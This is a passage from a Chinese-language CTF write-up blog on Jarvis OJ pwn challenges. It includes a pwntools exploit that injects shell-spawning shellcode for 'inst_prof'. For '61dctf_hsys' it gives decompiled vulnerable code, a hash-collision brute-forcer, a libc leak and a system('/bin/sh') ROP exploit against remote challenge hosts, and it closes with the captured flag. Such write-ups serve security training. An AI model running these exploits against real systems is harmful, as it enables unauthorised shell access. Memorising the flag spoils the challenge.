class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    cn = process(<span class="string">'./inst_prof_p'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    cn = remote(<span class="string">'111.230.149.72'</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span><span class="params">(a=<span class="string">''</span>)</span>:</span></span><br><span class="line">    gdb.attach(cn,a)</span><br><span class="line">    <span class="keyword">if</span> a == <span class="string">''</span>:</span><br><span class="line">        raw_input()</span><br><span class="line"></span><br><span class="line">cn.recvuntil(<span class="string">'ready\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#set r14 to rw section</span></span><br><span class="line">cn.send(<span class="string">'I\x89\xde\xc3'</span>)<span class="comment">#'mov r14,rbx;ret'</span></span><br><span class="line">cn.send(<span class="string">'I\xff\xc6\x90'</span>)<span class="comment">#'inc r14;nop'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#backup r14</span></span><br><span class="line">cn.send(<span class="string">'M\x89\xf5\xc3'</span>)<span class="comment">#'mov r13,r14;ret'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#write shellcode to rw section</span></span><br><span class="line">sc = asm(shellcraft.sh())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(sc)):</span><br><span class="line">    cn.send(<span class="string">'A\xc6\x06'</span>+sc[i])<span class="comment">#'mov byte ptr [r14],%d' % ord[sc[i]]</span></span><br><span class="line">    cn.send(<span class="string">'I\xff\xc6\xc3'</span>)<span class="comment">#'inc r14;ret'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#add r14 0x1000</span></span><br><span class="line">cn.send(<span class="string">'I\xff\xc6\x90'</span>)<span class="comment">#'inc r14;nop'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#get code_section</span></span><br><span class="line">cn.send(<span class="string">'L\x8b&lt;$'</span>)<span class="comment">#'mov r15,[rsp]' #do_test+88 0000000000000B18</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#get gadget address, write gadget</span></span><br><span class="line"><span class="comment">#0x0000000000000aab : pop rbx ; pop r12 ; pop rbp ; ret</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x18</span>+<span class="number">0x55</span>):</span><br><span class="line">    cn.send(<span class="string">'I\xff\xcf\xc3'</span>)<span class="comment">#'dec r15;ret'</span></span><br><span class="line">cn.send(<span class="string">'M\x89&gt;\xc3'</span>)<span class="comment">#'mov [r14],r15;ret'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    cn.send(<span class="string">'I\xff\xc6\xc3'</span>)<span class="comment">#'inc r14;ret'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#write gadget args</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    cn.send(<span class="string">'M\x89.\xc3'</span>)<span class="comment">#'mov [r14],r13;ret'</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        cn.send(<span class="string">'I\xff\xc6\xc3'</span>)<span class="comment">#'inc r14;ret'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gadget ret address</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:0000000000000B03 ; 14:   make_page_executable(v0);</span></span><br><span class="line"><span class="string">.text:0000000000000B03                 call    make_page_executable</span></span><br><span class="line"><span class="string">.text:0000000000000B08 ; 15:   t1 = __rdtsc();</span></span><br><span class="line"><span class="string">.text:0000000000000B08                 rdtsc</span></span><br><span class="line"><span class="string">.text:0000000000000B0A                 shl     rdx, 20h</span></span><br><span class="line"><span class="string">.text:0000000000000B0E                 mov     r12, rax</span></span><br><span class="line"><span class="string">.text:0000000000000B11                 xor     eax, eax</span></span><br><span class="line"><span class="string">.text:0000000000000B13                 or      r12, rdx</span></span><br><span class="line"><span class="string">.text:0000000000000B16 ; 16:   ((void (__fastcall *)(_DWORD *))v0)(v0);</span></span><br><span class="line"><span class="string">.text:0000000000000B16                 call    rbx</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x55</span>):</span><br><span class="line">    cn.send(<span class="string">'I\xff\xc7\xc3'</span>)<span class="comment">#'inc r15;ret'</span></span><br><span class="line">cn.send(<span class="string">'M\x89&gt;\xc3'</span>)<span class="comment">#'mov [r14],r15;ret'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#set rsp to ROP</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(sc)):</span><br><span class="line">    cn.send(<span class="string">'I\xff\xc5\xc3'</span>)<span class="comment">#'inc r13;ret'</span></span><br><span class="line">cn.send(<span class="string">'I\xff\xc5\x90'</span>)<span class="comment">#'inc r13;nop'</span></span><br><span class="line">cn.send(<span class="string">'L\x89\xec\xc3'</span>)<span class="comment">#'mov rsp,r13;ret'</span></span><br><span class="line"></span><br><span class="line">cn.recv()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="PWN-61dctf-hsys"><a href="#PWN-61dctf-hsys" class="headerlink" title="PWN - 61dctf_hsys"></a>PWN - 61dctf_hsys</h2><p>题目描述:</p>
<blockquote>
<p>nc pwn2.jarvisoj.com 9896<br><a href="https://dn.jarvisoj.com/challengefiles/hsys.rar.a1535993cee9fa88418b64a4bcc64813" target="_blank" rel="noopener">hsys.rar.a1535993cee9fa88418b64a4bcc64813</a></p>
</blockquote>
<p>程序有点长,洞不是很好找.</p>
<p>首先,正常我们是没有del的能力的,只有admin,即id=0才能delete.</p>
<p>作者写了一个hash表来存放用户</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">add_hacker</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  hacker *p; <span class="comment">// ST18_4</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [esp+1Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+20h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> id; <span class="comment">// [esp+24h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">size_t</span> n; <span class="comment">// [esp+28h] [ebp-10h]</span></span><br><span class="line"></span><br><span class="line">  n = <span class="built_in">strlen</span>(name);</span><br><span class="line">  <span class="keyword">if</span> ( n &gt;= <span class="number">0x28</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  id = hashid(name);</span><br><span class="line">  j = id;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">1338</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    j = (<span class="keyword">signed</span> <span class="keyword">int</span>)(id + i) % <span class="number">1337</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !chunklist[j] )                        <span class="comment">// NULL</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(chunklist[(<span class="keyword">signed</span> <span class="keyword">int</span>)(id + i) % <span class="number">1337</span>]-&gt;name, name) )<span class="comment">// 已经有了,满了能得到admin</span></span><br><span class="line">      <span class="keyword">return</span> (<span class="keyword">signed</span> <span class="keyword">int</span>)(id + i) % <span class="number">1337</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  p = (hacker *)<span class="built_in">malloc</span>(<span class="number">0x38</span>u);</span><br><span class="line">  p-&gt;id = j;</span><br><span class="line">  <span class="built_in">memcpy</span>(p-&gt;name, name, n);                     <span class="comment">// 没有加入0字节截断，leak</span></span><br><span class="line">  p-&gt;name[<span class="number">39</span>] = <span class="number">0</span>;                              <span class="comment">// name [39]结尾截断</span></span><br><span class="line">  p-&gt;intro = <span class="number">0</span>;</span><br><span class="line">  chunklist[j] = p;</span><br><span class="line">  <span class="keyword">return</span> j;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先,admin的id实际上并不是0,所以直接add一个admin,并不会获得id=0<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> &gt;&gt; add admin</span><br><span class="line">Hacker `admin` added to system with id 98, you can use info|age|gender command to set more information for him/her</span><br></pre></td></tr></table></figure></p>
<p>根据逻辑,如果98(admin的真实id)后面的空都被填满了,那么找到0的时候就会发现name==admin,从而获得id0.</p>
<p>之后是add hacker时,name没有截断,只是在name[39]处加了一个0字节.因此我们可以构造堆块从而泄露<code>main_arena</code>的地址从而获得libc基地址.</p>
<p>第二个洞是在show的地方.</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(action, <span class="string">"show"</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( now_id &gt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        fmt = <span class="string">"%d: Name: %s, Age %d, Gender: %s, Info: "</span>;</span><br><span class="line">        v43 = <span class="number">0x80</span>;</span><br><span class="line">        v42 = <span class="string">"Male"</span>;</span><br><span class="line">        v41 = <span class="string">"Female"</span>;</span><br><span class="line">        pbuf = buf;</span><br><span class="line">        v39 = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x80</span>u);</span><br><span class="line">        name = chunklist[now_id]-&gt;name;</span><br><span class="line">        age = chunklist[now_id]-&gt;age;</span><br><span class="line">        gender = v42;</span><br><span class="line">        <span class="keyword">if</span> ( !LOBYTE(chunklist[now_id]-&gt;gender) )</span><br><span class="line">          gender = v41;</span><br><span class="line">        id_1 = now_id;</span><br><span class="line">        v19 = name;</span><br><span class="line">        v20 = age;</span><br><span class="line">        v21 = gender;</span><br><span class="line">        v38 = <span class="built_in">sprintf</span>(pbuf, fmt, now_id, name, age, gender);<span class="comment">// 打印除info外的数据</span></span><br><span class="line">        part1 = get_weishu(now_id) + <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">if</span> ( now_id )</span><br><span class="line">        &#123;</span><br><span class="line">          pchar = chunklist[now_id]-&gt;name;</span><br><span class="line">          len_name = <span class="built_in">strlen</span>(pchar);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          len_name = <span class="number">5</span>;                         <span class="comment">// len admin</span></span><br><span class="line">        &#125;</span><br><span class="line">        pchar = (<span class="keyword">char</span> *)chunklist[now_id]-&gt;age;</span><br><span class="line">        part2 = len_name + part1 + <span class="number">6</span>;</span><br><span class="line">        age_weishu = get_weishu((<span class="keyword">int</span>)pchar);</span><br><span class="line">        gender_num = <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !LOBYTE(chunklist[now_id]-&gt;gender) )<span class="comment">// gender 0</span></span><br><span class="line">          gender_num = <span class="number">6</span>;</span><br><span class="line">        len_before = gender_num + age_weishu + part2 + <span class="number">10</span> + <span class="number">8</span>;</span><br><span class="line">        len_after = <span class="number">127</span> - len_before;</span><br><span class="line">        <span class="keyword">if</span> ( chunklist[now_id]-&gt;intro )</span><br><span class="line">        &#123;</span><br><span class="line">          pchar = chunklist[now_id]-&gt;intro;</span><br><span class="line">          len_intro = <span class="built_in">strlen</span>(pchar);</span><br><span class="line">          <span class="keyword">if</span> ( len_intro &gt; len_after )</span><br><span class="line">          &#123;</span><br><span class="line">            v29 = buf;</span><br><span class="line">            v14 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">            <span class="built_in">memcpy</span>(&amp;v29[v14], chunklist[now_id]-&gt;intro, len_after);<span class="comment">// 我觉得有鬼，问题在于怎么让name超长，然后就能rop了</span></span><br><span class="line">            buf[<span class="number">124</span>] = <span class="string">'.'</span>;</span><br><span class="line">            buf[<span class="number">125</span>] = <span class="string">'.'</span>;</span><br><span class="line">            buf[<span class="number">126</span>] = <span class="string">'.'</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v32 = buf;</span><br><span class="line">            v12 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">            pchar = chunklist[now_id]-&gt;intro;</span><br><span class="line">            v31 = &amp;v32[v12];</span><br><span class="line">            v30 = pchar;</span><br><span class="line">            len_intro_1 = <span class="built_in">strlen</span>(pchar);</span><br><span class="line">            <span class="built_in">memcpy</span>(v31, v30, len_intro_1);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>                                    <span class="comment">// no intro</span></span><br><span class="line">        &#123;</span><br><span class="line">          v34 = buf;</span><br><span class="line">          v10 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">          v33 = <span class="built_in">strcpy</span>(&amp;v34[v10], <span class="string">"N/A"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        v28 = <span class="built_in">puts</span>(buf);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v45 = <span class="built_in">printf</span>(<span class="string">"You must add a hacker first and then show information about him/her\n"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>本来很简单的过程,非要搞的这么复杂,我觉得这里是本题比较失败的地方,因为他给人一种恶意构造的感觉,(感觉这里肯定造了一个洞).</p>
<p>果然,要让memcpy溢出,关键在于怎么让name超长.<br>方法是,当id为0时,他没有通过strlen计算name的长度,而是使用了定长5,根据前面的hash表,只要我们计算出一个很长的name,并使他的hashid为0,且此时表满,那么这个很长的name就会获得id0.我随便撞了一个出来<code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabx</code>,代码很丑.</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">hashid</span><span class="params">(<span class="built_in">string</span> name)</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> len = name.length();</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> k;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        k = <span class="number">0x401</span>*(name[i]+j);</span><br><span class="line">        j = (k&gt;&gt;<span class="number">6</span>)^k;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> ret;</span><br><span class="line">    ret = (<span class="number">0x8001</span> * (((<span class="number">9</span>*j)&gt;&gt;<span class="number">11</span>)^<span class="number">9</span>*j))%<span class="number">1337</span>;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">string</span> a = <span class="string">"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"</span>;</span><br><span class="line">    <span class="built_in">string</span> b;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="string">'a'</span>;i&lt;<span class="string">'z'</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">char</span> j=<span class="string">'a'</span>;j&lt;<span class="string">'z'</span>;j++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">char</span> m=<span class="string">'a'</span>;m&lt;<span class="string">'z'</span>;m++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">char</span> n=<span class="string">'a'</span>;n&lt;<span class="string">'z'</span>;n++)&#123;</span><br><span class="line">            b=a;</span><br><span class="line">            b+=i;</span><br><span class="line">            b+=j;</span><br><span class="line">            b+=m;</span><br><span class="line">            b+=n;</span><br><span class="line">        <span class="keyword">if</span>(hashid(b) == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;b&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    cn = process(<span class="string">'./hsys'</span>)</span><br><span class="line">    bin = ELF(<span class="string">'./hsys'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    cn = remote(<span class="string">'pwn2.jarvisoj.com'</span>, <span class="number">9896</span>)</span><br><span class="line">    bin = ELF(<span class="string">'./hsys'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.19.so'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span><span class="params">(a=<span class="string">''</span>)</span>:</span></span><br><span class="line">    gdb.attach(cn,a)</span><br><span class="line">    <span class="keyword">if</span> a == <span class="string">''</span>:</span><br><span class="line">        raw_input()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1337</span>):</span><br><span class="line"></span><br><span class="line">    cn.sendline(<span class="string">'add '</span>+str(i))</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">cn.sendline(<span class="string">'add test'</span>)</span><br><span class="line">cn.recv()</span><br><span class="line">cn.sendline(<span class="string">'add test2'</span>)</span><br><span class="line">cn.recv()</span><br><span class="line">cn.sendline(<span class="string">'add test'</span>)</span><br><span class="line">cn.recv()</span><br><span class="line">cn.sendline(<span class="string">'info '</span>+<span class="string">'W'</span>*<span class="number">0x80</span>)</span><br><span class="line">cn.recv()</span><br><span class="line">cn.sendline(<span class="string">'add test3'</span>)</span><br><span class="line">cn.recv()</span><br><span class="line">cn.sendline(<span class="string">'add admin'</span>)</span><br><span class="line">cn.recv()</span><br><span class="line">cn.sendline(<span class="string">'del test'</span>)</span><br><span class="line">cn.recv()</span><br><span class="line">cn.sendline(<span class="string">'add b'</span>)<span class="comment">#test chunk</span></span><br><span class="line">cn.recv()</span><br><span class="line">cn.sendline(<span class="string">'show'</span>)</span><br><span class="line">cn.recv()</span><br><span class="line">cn.sendline(<span class="string">'info '</span>+<span class="string">'Q'</span>*<span class="number">0xf0</span>)<span class="comment">#0xf76d57b0 (main_arena+48)</span></span><br><span class="line">cn.recv()</span><br><span class="line">cn.sendline(<span class="string">'add c'</span>)</span><br><span class="line">cn.recv()</span><br><span class="line">cn.sendline(<span class="string">'show'</span>)</span><br><span class="line">cn.recvuntil(<span class="string">'Name: c'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    main_arena=<span class="number">0x1b2780</span></span><br><span class="line">    libc.address = u32(<span class="string">'\xb0'</span>+cn.recv(<span class="number">3</span>))<span class="number">-48</span>-main_arena</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    main_arena=<span class="number">0x1AB420</span></span><br><span class="line">    libc.address = u32(<span class="string">'\x50'</span>+cn.recv(<span class="number">3</span>))<span class="number">-48</span>-main_arena</span><br><span class="line">success(<span class="string">'libc_base: '</span>+hex(libc.address))</span><br><span class="line"></span><br><span class="line">adminname = <span class="string">'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabx'</span></span><br><span class="line"></span><br><span class="line">cn.sendline(<span class="string">'add aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabx'</span>)</span><br><span class="line">cn.recv()</span><br><span class="line"></span><br><span class="line">system = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh = libc.search(<span class="string">'/bin/sh\x00'</span>).next()</span><br><span class="line">pay = <span class="string">"A"</span>*<span class="number">0x3A</span> + p32(system)+<span class="string">'bbbb'</span>+p32(binsh)</span><br><span class="line">cn.sendline(<span class="string">'info '</span>+pay)<span class="comment">#0xf76d57b0 (main_arena+48)</span></span><br><span class="line">cn.recv()</span><br><span class="line">cn.sendline(<span class="string">'show'</span>)</span><br><span class="line">cn.sendline(<span class="string">'exit'</span>)</span><br><span class="line"><span class="comment">#z('b*0x08049FAB\nc')</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure>
<p>flag:<code>CTF{13185363efdbb3f76cbcb5c276c3a7e8}</code></p>

      
    </div>

    

    
    
    

    

    

    
      <div>
        <ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>Post author:  </strong>Veritas501</li>
  <li class="post-copyright-link">
    <strong>Post link: </strong>
    <a href="https://veritas501.github.io/2017/03/10/JarvisOJ_WP/" title="Jarvis OJ平台 WP">https://veritas501.github.io/2017/03/10/JarvisOJ_WP/</a>
  </li>
  <li class="post-copyright-license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> unless stating additionally.</li>
</ul>

      </div>
    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/CTF/" rel="tag"># CTF</a>
          
            <a href="/tags/PWN/" rel="tag"># PWN</a>
          
            <a href="/tags/Jarvis-OJ/" rel="tag"># Jarvis OJ</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2017/03/04/脑洞大开 - NTFS交换数据流ADS/" rel="next" title="脑洞大开 - NTFS交换数据流ADS">
                <i class="fa fa-chevron-left"></i> 脑洞大开 - NTFS交换数据流ADS
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2017/04/01/又智障了/" rel="prev" title="又智障了">
